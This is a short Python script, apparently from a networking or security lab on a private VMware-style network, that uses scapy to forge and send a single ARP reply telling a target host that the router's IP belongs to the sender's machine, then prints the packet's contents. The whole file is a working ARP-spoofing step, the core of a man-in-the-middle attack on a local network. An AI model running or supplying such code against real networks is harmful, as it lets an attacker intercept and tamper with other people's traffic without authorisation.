import scapy.all as scapy 


target_ip="192.168.132.30"
target_mac="00:0c:29:7d:74:e0"
router_ip="192.168.132.2"
router_mac="00:50:56:f3:4b:8e"

#send "I have the routers MAC address" to target 
packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip)
scapy.send(packet)
#contents of packet
print(packet.show())
print(packet.summary())

